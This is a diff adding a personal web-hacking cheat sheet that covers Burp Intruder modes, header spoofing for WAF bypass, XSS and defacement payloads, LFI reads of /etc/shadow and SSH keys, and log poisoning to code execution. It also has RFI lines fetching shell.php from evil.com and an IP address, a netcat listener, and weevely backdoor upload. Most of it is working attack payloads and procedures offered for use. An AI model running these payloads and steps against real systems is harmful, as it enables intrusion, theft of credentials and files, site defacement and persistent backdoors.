@@ -1,0 +1,242 @@
+Web Vulnerability:
+
+Sniper : In a one target at a time with a single payload. it will be n times.
+Battering Ram : In a both target at a time with a single payload. it will be n times.
+PitchFork : In a both target at a time with a both payload. it will be n times.
+Cluster Bomb: In a both target at a time with a both payload. it will be n*n times.
+
+Some Extention : JS Link Finder, 403 Bypasser, Wordpress Scanner,CMS Scanner, Software Vulnerability Scanner, Pentest Mapper, Js Miner, XSS Validator, upload Scanner, Retire.js, Autoowasp, Autorize, Auth Analyzer, Burp Bounty Pro, ParamMiner, Nuclei Template Genarate Plugin
+
+xss validator , NET Beautifier, Wsdler , Bypass WAF, J2EEScan , Param Miner, Collaborator Everywhere, Wayback Machine, JS Link Finder, Upload Scanner, Nucleus Burp Extension, Software Vulnerability Scanner, Active Scan++,  Acunetix Scanner or If you Looking for something free and cool [reNgine], toggle, jsminer, Sensitive Discoverer
+
+uplaod scanner, Reflected Parameters, paraminer, Activescan++, Burp Customizer
+
+BurpSuite Auto Completion, Burp Headup, BurpSuite_403Bypasser, Content type convertor, XSS Validator, JWT Editor, PWNFox, Paramalyzer, HTTP Request Smuggler, Fake IP
+
+For Waf Bypass:
+X-Originating-IP: 127.0.0.1 
+X-Forwarded-For: 127.0.0.1 
+X-Remote-IP: 127.0.0.1 
+X-Remote-Addr: 127.0.0.1 
+
+
+Http Host Header Attack:
+
+▶ Enable Burp JS Link Finder 
+
+Some Other Header:
+X-Custom-IP-Authorization
+X-Forwarded-For
+X-Forward-For
+X-Remote-IP
+X-Originating-IP
+X-Remote-Addr
+X-Client-IP
+X-Real-IP
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Original-URL: 127.0.0.1
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+Host: localhost
+X-Real-IP: 127.0.0.1
+
+XSS:
+
+Tools : XSStrike, BruteXSS Terminal, BruteXSS GUI, XSS Scanner Online, XSSer, xsscrapy, Cyclops
+
+--> Payload Source : PayloadsAllTheThings XSS, Payloadbox XSS
+
+<scriscriptpt>alert(10)</scriscriptpt>    	- When script is senitized
+';alert("THM");//     				- When Dom
+"><img src=x onerror=alert(document.domain)>    - Normal Payload
+"><script>alert("1")</script>   		- Normal Payload
+/images/cat.jpg" onload="alert("who");          - when path is showing
+
+
+Note : take subdomain and sort and use httpx/dnsx/httprobe use waybackurls, hakrawler, gauplus, katana, gauspider and then sort and use gf
+
+git clone http://github.com/s0md3v/XSStrike
+pip3 install -r requirements.txt
+python xsstrike.py --help
+python xsstrike.py -u <link with parameter> 
+
+xsser:
+./xsser -h
+./xsser --gtk
+
+--XSS in simple way--
+01. First find the endpoint by Recon
+02. Find out the input,comment, username, user-interface segment
+03. copy the url and automation tools 
+04. you can also use burp suite intruder options to check xss automatically
+
+--XSS Attack--
+01. Recon
+02. Discover the endpoint, input field and comment box to check xss
+03. Use payload according to target application features
+04. For automation vulnerability scanning bruteforceing parameter value
+
+--Deface Using XSS-
+01. Recon
+02. Discover the endpoint, input field and comment box to check xss
+03. use deface payload according to target application features
+
+impact: changing page text, changing page title, changing body color etc
+
+deface:
+<script>document.body.style.background = "tomato" </script>
+<script>document.body.background = "image link" </script>
+
+Blind XSS: xsshunter, bxss, Burp collaborator
+
+Unique Payload:
+
+x' onerror='alert()
+x' onerror='alert("Who")
+'/><script>alert(window.origin)</script>
+x'><script>alert(1)</script>
+"><svg onload=alert(1)>
+
+Note:
+If you see that your payload is senitiized then
+▶ Try to encode it. you can encode 5 times. try encode base64 and url encooder
+▶ or you can use uppoercase lowercase etc
+▶ &gt; -- > and &lt -- < and  &quot; -- "
+
+For Create a normal server:
+For Knowing Ip : ifconfig
+For Create a Port : nc -lvnp 4444
+
+Exploit : ip:port
+
+--DOM--
+
+▶ DOM stands for Document Object Model
+▶ It is an application programming interface (API) for manipulating HTML Documents
+▶ It provides functions that allow you to add, remove and modify parts of the document effectively
+
+There are 2 important Think Sink and source
+
+Sink :
+▶ A sink is any part of the code that handles or consumes data
+▶ It includes functions or operations that many execute or use the data obtained from sources.
+▶ sink can invoice actions like displaying data to users, making network requests, updating databases, executing commands or any operations that deals with data
+
+Source:
+▶ A source is any input or provider of data in a JS application
+▶ Sources can include user inputs(such as input fields, URLS, paramters) data from external APIs o any data that originates from an untrusted or external enviroment
+
+Those part which is calling is source, which think is used is sink. Source is sourse, sink is connector, bridge etc
+
+LFI:
+
+▶ LFI stands for Local file Inclusion
+▶ It is a file inclusion vulnerability that is usually used to read sensitive files
+▶ Attacker manipulates input fields or parameters that are used by the applications to includes files from the local file system
+▶ Access sensitive files such as /etc/passwd, /etc/shadow, /home/usr/.ssh/id_rsa
+
+payload List : D:\D0LPH1N\Bug Hunting\Payloads\LFI
+D:\D0LPH1N\Bug Hunting\portSwigger\LFI
+
+LFI vs Path Traversal:
+
+LFI: LFI specifically targets web applications that dynamically include files based on user supplied input, such as file paths or parameters. Attackers exploit this vulnerability by manipulating these inputs to access files on the server that should not be accessible.The goal of LFI is to include and execute files that reside locally on the server where the web application is hosted
+
+Path Traversal: It is vulnerability that allows an ttacker to access files or directories that are outside the web applications root directory.It invloves manipulating file path inputs to navigate to directories and retrieve files that should be retricted.The objective of path traversal is to traverse beyond the intended directory structure, potentially accessing sensitive system files or directories
+
+Keypoint:
+
+▶ First Try /../../../../
+▶ Then Try ....//....//....//....//
+▶ Try to Encoding [url or Base64]
+▶ Try to Null %00
+▶ Use LFI/RFI Wrapper
+▶ Try to PHP Wrapping
+
+Source : 
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+https://github.com/payloadbox/rfi-lfi-payload-list
+For More Payload :  /usr/share/seclists/Fuzzing/LFI
+
+Log Poisioning [LFI > RCE]: 
+
+Note : First try to Detect which server is running
+01. First find the LFI
+02. To permission read the Log File
+03. To write permission
+04. to set the RCE payload in Header[user-agent] 
+
+Common Log path:
+/var/log/apache/access.log
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+
+Search google : Apache log poisioning RCE Payload
+
+Process:
+01. First find the LFI and if you find LFI then FInd Common log path and see the Status codes
+02. Then go to user agent and type <?php system($_GET['cmd']); ?>
+03. and then hit triggure by .log&cmd= in 1st line
+
+pwd
+ls
+ls+-/
+ls/ --> encode it with url
+cat file.txt
+cat+file.txt --> encode it with url
+
+* Php Filters and PHP wrapper:
+▶ There are four different type of filters availavle for use, which are string Filters, conversion FIlters, Compression FIlters and Encryption Fillters. 
+▶ Filters that is useful for LFI attacks is the convert.base64-encode filter, under Coonversion Filters.
+
+* LFI Not always RFI:
+▶ LFI May not necessarily be an RFI. This is primarily because of Three Reasons:
+▶ The vulnerable function may not allow including remote URLS
+▶ You may only control a portion of the filename and not the entire protocol wrapper (example: http://, ftp://, https://)
+▶ The configuration may prevent RFI altogether, as most modern web servers disable including remot file by default
+
+*RFI:
+
+Remote File inclusion is an attack targeting vulnerabilities in web applications that dynamically reference external scripts. The perpetrators goal is to exploit the referencing fucntion in an application to upload malware from a remote URL located within a different domain
+
+Common Php : <?php system($_GET['cmd']); ?>
+Execute : shell.php&cmd= 
+For Python Server : sudo python3 -m http.server 1234
+
+Example:
+
+LFI : http://example.com/index.php?page=../../../etc/passwd%00
+RFI : http://example.com/index.php?page=http://evil.com/shell.txt%00
+
+Verify RFI:
+▶ Check LFI vulnerability first
+▶ Check allow_url_include enable or not
+▶ http://127.0.0.1:80/index.php
+
+RFI to RCE:
+▶ Check RFI vulnerability First
+▶ Create a shell
+▶ call your reverse shell
+
+Note:
+▶ If i am seeing or reading sever passwd, shadow file this is LFI
+▶ if i am executing and visiting any kind of link this is RFI
+▶ if i am executing any kind of shell this is RCE
+
+LFI : http://example.com/index.php?page=../../../etc/passwd%00
+RFI : http://example.com/index.php?page=http://evil.com/shell.txt%00
+RCE : http://example.com/index.php?page=http://10.20.30.40/shell.php
+
+Normal Webshell:
+▶ weevely genarate <pass> <file>
+▶ weevely genarate 1234 shell.php
+▶ Now upload your backdoor in php server
+▶ weevely 10.20.30.40/shell.php 1234
+
